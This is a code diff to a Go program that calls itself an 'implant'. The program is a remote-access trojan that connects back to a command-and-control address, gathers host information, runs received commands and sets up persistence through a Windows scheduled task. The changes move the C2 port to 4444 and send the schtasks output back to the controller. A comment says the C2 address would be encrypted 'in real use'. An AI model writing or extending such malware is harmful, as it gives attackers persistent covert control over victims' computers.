@@ -232,6 +232,7 @@ func hostinfo(conn net.Conn) bool {
 
 func persist(conn *net.Conn, taskName string) { //Refine it a bit more
 	//Create Scheduled Task. I had to do it this way since golang tends to mess up cmd.exec sometimes. This is just safer and easier option.
+	(*conn).Write([]byte("OK\n"))
 	command := []string{
 		"/C",
 		"schtasks",
@@ -249,9 +250,8 @@ func persist(conn *net.Conn, taskName string) { //Refine it a bit more
 	if err != nil {
 		fmt.Println("[-] Failed to create task:", err)
 	}
-	fmt.Println(string(output))
-
-	(*conn).Write([]byte("OK\n"))
+	//fmt.Println(string(output))
+	(*conn).Write([]byte(string(output)))
 }
 
 func unifiedCommandHandler(conn *net.Conn, implantWD *string) {
@@ -324,7 +324,7 @@ func unifiedCommandHandler(conn *net.Conn, implantWD *string) {
 }
 
 func main() {
-	c2Address := "192.168.0.102:4321" // Encrypt/decode at runtime in real use
+	c2Address := "192.168.0.102:4444" // Encrypt/decode at runtime in real use
 	attempts := 0
 	implantWD, _ := os.Getwd()
 	fmt.Println("Implant Started")
